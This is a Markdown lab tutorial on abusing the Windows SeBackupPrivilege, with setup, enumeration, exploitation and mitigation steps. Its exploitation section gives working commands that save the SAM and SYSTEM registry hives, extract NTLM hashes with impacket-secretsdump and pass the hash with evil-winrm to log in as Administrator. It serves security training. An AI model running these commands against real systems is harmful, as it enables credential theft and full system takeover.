# SeBackupPrivilege

## Table of Contents

- [SeBackupPrivilege](#SeBackupPrivilege)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Tool Enumeration](#tool-enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

The SeBackupPrivilege is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects. This privilege can be used by certain backup programs or processes that require the capability to back up or copy files that would not normally be accessible to the user. 

However, if this privilege is not properly managed or if it is granted to unauthorized users or processes, it can lead to a privilege escalation vulnerability. The SeBackupPrivilege vulnerability can be exploited by malicious actors to gain unauthorized access to sensitive files and data on a system.

## Lab Setup

### Manual Lab Setup

:warning: <b>If you are using Windows 10/11 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>

1) Open a PowerShell with local Administrator privileges and run the following command to create a new user:

```
net user ncv Passw0rd! /add
```

2) Run the following command to enable WinRM service:

```
Enable-PSRemoting -Force
```

3) Add the new user to "Remote Management Users" group:

```
net localgroup "Remote Management Users" ncv /add
```
  
4) Then, run the following commands to install and import the Carbon module:

```
Install-Module -Name carbon -Force
```

 and 

 ```
 Import-Module carbon
 ```

 5) Use the following cmdlets to grant the SeBackupPrivilege to the current user and verify the privilege:

 ```
 Grant-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

 and

 ```
 Test-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

Outcome:

![SebackupPrivilege-Manual-Setup](/Pictures/SeBackUp-Manual-Setup2.png)

### PowerShell Script Lab Setup 

:warning: <b>If you are using Windows 10/11 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>

To set up the lab with the 'SeBackupPrivilege' vulnerability is by using the custom PowerShell script named [SeBackupPrivilege.ps1](/Lab-Setup-Scripts/SeBackupPrivilege.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\SeBackupPrivilege.ps1
```

Outcome:

![SebackupPrivilege-Script-Setup](/Pictures/SeBackUp-Script1.png)

## Enumeration

### Manual Enumeration

To perform manual enumeration, you can open a command prompt and use the following command to enumerate the current privileges of the user:

```
whoami /priv
```

Outcome:

![SeBackupPrivilege-Manual-Enumeration](/Pictures/SeBackUp-Manual-Enum1.png)

### Tool Enumeration

To run the [SharpUp](https://github.com/GhostPack/SharpUp) tool and perform an enumeration of the `SeBackupPrivilege` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit TokenPrivileges
```

Outcome:

![SeBackupPrivilege-Tool-Enumeration](/Pictures/SeBackUp-Tool-Enum.png)

## Exploitation

To abuse this vulnerability you should follow these steps:

1) Create a temp directory:

```
mkdir C:\temp
```

2) Copy the sam and system hive of HKLM to C:\temp and then download them.

```
reg save hklm\sam C:\temp\sam.hive
```

and

```
reg save hklm\system C:\temp\system.hive
```

Outcome:

![SeBackupPrivilege-Exploitation-Copy-Hives](/Pictures/SeBackUp-Exploitation-1.png)

3) Use [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) tool (Kali Linux Default) and obtain ntlm hashes:

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Outcome:

![SeBackupPrivilege-Exploitation-Observe-NTLM-Hashes](/Pictures/SeBackUp-Exploitation-2.png)

4) Use again evil-winrm to pass the hash and connect as Local Administrator:

```
evil-winrm -i <ip> -u "Administrator" -H "<hash>"
```

Outcome:

![SeBackupPrivilege-Exploitation-Evil-WinRM-Pass-The-Hash](/Pictures/SeBackUp-Exploitation-3.png)

## Mitigation

Follow the steps below to remove the `SeBackupPrivilege` from a user:

1) Press Win + R to open the Run dialog, type `secpol.msc`, and hit Enter. This will open the Local Security Policy editor.

2) In the Local Security Policy editor, navigate to **Local Policies** > **User Rights Assignment**.

3) Look for the **Back up files and directories** policy (which corresponds to SeBackupPrivilege).

4) Double-click the policy, and a properties window will appear.

5) In the properties window, you can remove the user or group from the list to revoke the privilege. Click **Apply** and then **OK** to save the changes.

## References

- [Special privileges assigned to new logon Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672)
